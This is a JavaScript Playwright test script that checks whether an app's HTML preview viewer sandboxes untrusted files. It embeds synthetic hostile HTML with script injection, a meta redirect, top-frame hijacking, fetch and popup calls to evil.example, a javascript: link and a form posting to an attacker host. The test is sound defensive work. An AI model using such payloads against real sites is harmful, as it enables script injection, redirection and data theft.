import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
const [phase, directory, port = '9396'] = process.argv.slice(2);
const run = realpathSync(directory); const verify = fileURLToPath(new URL('.', import.meta.url));
assert.notEqual(port, '8399');
const pixel = 'iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAIAAABvFaqvAAAAH0lEQVR4nGN41mNDFcQwatCoQaMGjRo0atCoQQNvEADxaMeuOCcmmgAAAABJRU5ErkJggg==';
const hostile = `<!doctype html><html><head><title>Static layout report</title>
<meta http-equiv="refresh" content="0;url=https://evil.example/navigate"><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"><base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/style.css"><style>@import 'https://evil.example/import.css';</style>
<style>body{margin:0;padding:28px;background:#f3f5f7;color:#192d40;font:16px system-ui}main{max-width:620px;margin:auto}h1{font-size:28px}article{background:white;border-radius:14px;padding:24px}table{width:100%;text-align:left}td,th{padding:8px}img{vertical-align:middle}</style>
<script>window.__htmlSentinel='ran';parent.__htmlSentinel='parent';top.location='https://evil.example/top';fetch('https://evil.example/fetch');window.open('https://evil.example/popup')</script>
</head><body onload="parent.__htmlSentinel='onload'"><main><p>FIELD NOTES · 16</p><article><h1>Static layout report</h1><p>Scripts and external assets are intentionally disabled.</p><img alt="Embedded raster" src="data:image/png;base64,${pixel}"><table><tr><th>Check</th><th>Result</th></tr><tr><td>Complete snapshot</td><td>Retained</td></tr><tr><td>Static layout</td><td>Visible</td></tr></table><details><summary>More detail</summary><p>Native HTML details still work.</p></details><p><a href="https://example.com/docs" target="_top">Reference docs</a></p></article>
<img src="https://evil.example/image" onerror="parent.__htmlSentinel='error'"><img src="/__html_probe__/same-origin">
<div style="background:url(https://evil.example/background)">Remote backgrounds removed</div>
<a href="javascript:parent.__htmlSentinel='javascript'">Bad link</a><a href="https://evil.example/navigation" target="_top">Authored navigation</a>
<form action="https://evil.example/form" target="_top"><input name="private"><button>Submit</button></form>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/object"></object><svg onload="alert(1)"><script>window.__htmlSentinel='svg'</script></svg>
</main></body></html>`;
if (phase === 'seed') {
 assert.equal(process.env.NODE_ENV, 'test'); assert.equal(process.env.HOME, join(run, 'home'));
 execFileSync('bun', [join(verify, 'preview-register.ts'), run, 'seed'], { stdio: 'inherit' });
 writeFileSync(join(run, 'workspace', 'hostile.html'), hostile);
 writeFileSync(join(run, 'workspace', 'deep.html'), '<div>'.repeat(520) + 'Deep source' + '</div>'.repeat(520));
 console.log('seeded synthetic hostile HTML and source-only document'); process.exit(0);
}
const rpc = (name, input) => {
 const out = execFileSync('bun', [join(verify, 'rpc.ts'), name, JSON.stringify(input)], { env: { ...process.env, VERIFY_PORT: port }, encoding: 'utf8' });
 const reply = JSON.parse(out).reply; assert(!reply.error, out); return reply.value ?? reply;
};
const register = (path) => {
 const result = rpc('artifact.file.register', { requestId: `html-viewer-${path}`, context: { kind: 'todo', id: 'todo' }, path, title: path === 'hostile.html' ? 'Static layout report' : 'Deep HTML source' });
 assert(result.accepted, JSON.stringify(result)); return result.artifact.artifactId;
};
if (phase === 'prepare') {
 rpc('rpc:providers.create', { params: { providerId: 'anthropic', displayName: 'Synthetic proxy', kind: 'built_in', authType: 'api_key', isEnabled: true, isDefault: true, sortOrder: 0 }, credentials: { apiKey: 'sk-devproxy-test-key' } });
 const opened = rpc('neo.open', {}); assert(opened.ok, JSON.stringify(opened));
 const hostileId = register('hostile.html'); const deepId = register('deep.html');
 const metadata = rpc('artifact.file.get', { artifactId: hostileId }); assert(metadata.accepted);
 writeFileSync(join(run, 'evidence', 'html-viewer-refs.json'), JSON.stringify({ root: opened.sessionId, ref: metadata.metadata.artifact, ids: { hostile: hostileId, deep: deepId } }));
 console.log('prepared registered HTML refs via RPC'); process.exit(0);
}
const ids = JSON.parse(readFileSync(join(run, 'evidence', 'html-viewer-refs.json'), 'utf8')).ids;
const { chromium } = createRequire(import.meta.url)('playwright');
const browser = await chromium.launch({ headless: true, ...(process.env.VERIFY_BROWSER ? { executablePath: process.env.VERIFY_BROWSER } : {}) });
const base = `http://127.0.0.1:${port}`; const attempts = []; const evidence = { ids, widths: {} };
try {
 for (const width of [1280, 390]) {
  const context = await browser.newContext({ viewport: { width, height: 900 }, locale: 'en-US' });
  await context.route('**/*', (route) => {
   const url = route.request().url();
   if (url.startsWith(base) && !url.includes('/__html_probe__/')) return route.continue();
   attempts.push(url); return route.abort();
  });
  await context.addCookies([{ name: 'artifactAppProbe', value: 'synthetic-cookie', url: base, sameSite: 'Strict' }]);
  const page = await context.newPage(); const dialogs = []; page.on('dialog', async (d) => { dialogs.push(d.message()); await d.dismiss(); });
  try {
   await page.goto(`${base}/neo`);
   await page.evaluate(() => { localStorage.setItem('artifactAppProbe', 'synthetic-local'); sessionStorage.setItem('artifactAppProbe', 'synthetic-session'); });
   assert.match(await page.evaluate(() => document.cookie), /artifactAppProbe=synthetic-cookie/);
   assert.equal(await page.evaluate(() => localStorage.getItem('artifactAppProbe')), 'synthetic-local');
   assert.equal(await page.evaluate(() => sessionStorage.getItem('artifactAppProbe')), 'synthetic-session');
   const card = page.getByRole('button', { name: 'Open preview: Static layout report' });
   await card.waitFor(); await card.scrollIntoViewIfNeeded();
   const scrollTop = await page.locator('main.neo-scroll').evaluate((node) => node.scrollTop);
   await card.click(); const openedUrl = page.url();
   await page.getByRole('dialog').waitFor();
   const section = page.getByRole('region', { name: 'File preview' });
   await section.locator('iframe').waitFor();
   await page.waitForTimeout(150);
   assert.equal(await page.locator('iframe').count(), 1, `HTML viewer absent: ${await section.innerText()}`);
   await page.getByText('Scripts disabled', { exact: true }).waitFor();
   const frameElement = page.locator('iframe'); assert.equal(await frameElement.getAttribute('sandbox'), '');
   assert.equal(await frameElement.getAttribute('referrerpolicy'), 'no-referrer'); assert.equal(await frameElement.getAttribute('allow'), null);
   const frame = page.frames().find((f) => f !== page.mainFrame()); assert(frame);
   await frame.getByRole('heading', { name: 'Static layout report' }).waitFor();
   assert.equal(await frame.locator('script,iframe,form,base,a[href],meta[http-equiv="refresh"]').count(), 0);
   assert.equal(await frame.getByAltText('Embedded raster').evaluate((img) => img.complete && img.naturalWidth > 0), true);
   assert.equal(await page.evaluate(() => window.__htmlSentinel), undefined);
   assert.equal(await frame.evaluate(() => window.__htmlSentinel), undefined);
   assert.equal(await frame.evaluate(() => { try { void parent.document.body; return 'accessible'; } catch { return 'denied'; } }), 'denied');
   const storage = await frame.evaluate(() => {
    const read = (callback) => { try { return { accessible: true, value: callback() }; } catch (error) { return error.name; } };
    return { cookie: read(() => document.cookie), local: read(() => localStorage.getItem('artifactAppProbe')), session: read(() => sessionStorage.getItem('artifactAppProbe')) };
   });
   assert.deepEqual(storage, { cookie: 'SecurityError', local: 'SecurityError', session: 'SecurityError' });
   await frame.getByText('More detail', { exact: true }).click(); await frame.getByText('Native HTML details still work.').waitFor({ state: 'visible' });
   assert((await frame.locator('body').innerText()).includes('Authored navigation'));
   assert.equal(page.url(), openedUrl); assert.equal(context.pages().length, 1); assert.deepEqual(dialogs, []); assert.deepEqual(attempts, []);
   const bounds = await frameElement.boundingBox(); assert(bounds && bounds.width <= width && bounds.x >= 0);
   const preparedDocument = await frameElement.getAttribute('srcdoc');
   await frameElement.evaluate((node) => { node.srcdoc = `<h1>Sandbox boundary probe</h1><script>window.__htmlSentinel='probe';parent.__htmlSentinel='probe';top.location='https://evil.example/top';window.open('https://evil.example/popup')</script><a target="_top" href="https://evil.example/top-click">Try top</a><a target="_blank" href="https://evil.example/popup-click">Try popup</a><form target="_top" action="https://evil.example/form"><button>Try form</button></form><button onclick="window.__htmlSentinel='handler'">Try handler</button>`; });
   await frame.getByRole('heading', { name: 'Sandbox boundary probe' }).waitFor();
   for (const name of ['Try top', 'Try popup', 'Try form', 'Try handler']) await frame.getByText(name, { exact: true }).click();
   assert.equal(await frame.evaluate(() => window.__htmlSentinel), undefined);
   assert.equal(await page.evaluate(() => window.__htmlSentinel), undefined);
   assert.equal(page.url(), openedUrl); assert.equal(context.pages().length, 1); assert.deepEqual(dialogs, []); assert.deepEqual(attempts, []);
   await frameElement.evaluate((node, document) => { node.srcdoc = document; }, preparedDocument);
   await frame.getByRole('heading', { name: 'Static layout report' }).waitFor();
   await page.screenshot({ path: join(run, 'evidence', `html-viewer-preview-${width}.png`) });
   await page.getByRole('button', { name: 'Reference docs', exact: true }).click();
   await page.getByText('Open this link in a new tab?').waitFor(); assert.equal(context.pages().length, 1);
   await page.screenshot({ path: join(run, 'evidence', `html-viewer-links-${width}.png`) });
   await page.getByRole('button', { name: 'Cancel', exact: true }).click();
   await page.keyboard.press('Escape');
   await page.getByRole('dialog').waitFor({ state: 'detached' });
   assert.equal(await page.locator('main.neo-scroll').evaluate((node) => node.scrollTop), scrollTop);
   assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Open preview: Static layout report');
   if (width === 390) {
    await card.click(); await page.locator('iframe').waitFor();
    execFileSync(join(verify, 'stop.sh'), [run]);
    await page.getByRole('status').filter({ hasText: 'The daemon that owns this file is not reachable.' }).waitFor({ timeout: 30000 });
    assert.equal(await page.locator('iframe,pre').count(), 0);
    await page.screenshot({ path: join(run, 'evidence', 'html-viewer-disconnected-390.png') });
    execFileSync(join(verify, 'launch.sh'), [port, run], { stdio: 'ignore' });
    await page.locator('iframe').waitFor({ timeout: 60000 });
    await page.keyboard.press('Escape');
    await page.getByRole('dialog').waitFor({ state: 'detached' });
   }
   await page.goto(`${base}/neo?artifact=${ids.hostile}`);
   await page.getByRole('region', { name: 'File preview' }).getByRole('heading', { name: 'Static layout report' }).waitFor();
   await page.getByRole('button', { name: 'Source', exact: true }).click();
   await page.locator('pre').filter({ hasText: "window.__htmlSentinel='ran'" }).waitFor();
   assert.equal(await page.locator('iframe').count(), 0); assert.equal(await page.locator('pre').innerText(), hostile);
   assert.equal(await page.evaluate(() => window.__htmlSentinel), undefined);
   await page.screenshot({ path: join(run, 'evidence', `html-viewer-source-${width}.png`) });
   await page.getByRole('button', { name: 'Back', exact: true }).click();
   await page.waitForURL(`${base}/neo`);
   await page.goto(`${base}/neo?artifact=${ids.deep}`);
   await page.getByText('HTML preview unavailable. View the original source.', { exact: true }).waitFor();
   await page.getByRole('button', { name: 'Source', exact: true }).click(); await page.locator('pre').filter({ hasText: 'Deep source' }).waitFor();
   assert.equal(await page.locator('iframe').count(), 0);
   await page.screenshot({ path: join(run, 'evidence', `html-viewer-source-only-${width}.png`) });
   evidence.widths[width] = { staticLayout: true, raster: true, scriptsDisabled: true, opaqueOrigin: true, appCookieDenied: true, localStorageDenied: true, sessionStorageDenied: true, sandboxWithoutCsp: true, noNavigation: true, noRemoteAssets: true, sourceEscaped: true, sourceOnlyFallback: true, dismissFocusScroll: true, disconnectClears: width === 390, dialogs, iframeWidth: bounds.width };
  } catch (error) { await page.screenshot({ path: join(run, 'evidence', `html-viewer-failure-${width}.png`) }); throw error; }
  finally { await context.close(); }
 }
} finally { await browser.close(); }
assert.deepEqual(attempts, []); evidence.attempts = attempts;
writeFileSync(join(run, 'evidence', 'html-viewer-web.json'), JSON.stringify(evidence, null, 2)); console.log(JSON.stringify(evidence));
